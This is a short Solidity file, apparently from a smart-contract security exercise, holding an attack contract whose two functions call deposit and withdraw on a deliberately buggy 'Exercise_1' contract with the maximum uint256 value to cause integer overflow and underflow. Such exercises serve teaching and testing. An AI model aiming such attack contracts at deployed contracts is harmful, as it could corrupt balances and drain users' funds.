// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Exercise_1} from "./BuggyCode.sol";

contract OverflowUnderflowContract {
    Exercise_1 private exercise_1;

    constructor(address _exercise_1) {
        exercise_1 = Exercise_1(_exercise_1);
    }

    // Function to perform an overflow attack
    function overflowAttack() public {
        // Overflow: Try to deposit a large amount causing an overflow
        exercise_1.deposit(msg.sender, type(uint256).max);
    }

    // Function to perform an underflow attack
    function underflowAttack() public {
        // Underflow: Try to withdraw more than the balance, causing an underflow
        exercise_1.withdraw(msg.sender, type(uint256).max);
    }
}
